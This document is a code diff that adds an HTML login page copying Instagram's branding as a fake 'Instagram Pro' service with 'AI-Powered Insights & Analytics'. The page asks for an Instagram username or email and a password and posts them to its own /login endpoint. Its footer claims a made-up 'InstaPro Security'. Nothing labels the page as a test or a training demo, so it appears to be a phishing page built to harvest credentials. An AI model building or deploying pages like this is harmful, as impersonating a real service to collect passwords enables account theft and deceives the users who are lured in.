@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Pro - Log in</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #FAFAFA; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 320px; text-align: center; }
+        .logo { font-size: 32px; font-weight: bold; color: #262626; margin-bottom: 5px; font-family: 'Grand Hotel', cursive; }
+        .tagline { font-size: 12px; color: #8e8e8e; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #DBDBDB; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 12px; background-color: #0095F6; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
+        button:hover { background-color: #1877F2; }
+        .pro-badge { background: #E1306C; color: white; font-size: 10px; padding: 2px 6px; border-radius: 4px; vertical-align: middle; margin-left: 5px; }
+        .footer { margin-top: 15px; font-size: 11px; color: #8e8e8e; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="logo">Instagram <span class="pro-badge">PRO</span></div>
+        <div class="tagline">AI-Powered Insights & Analytics</div>
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Username or Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="footer">Protected by InstaPro Security v4.2</div>
+    </div>
+</body>
+</html>
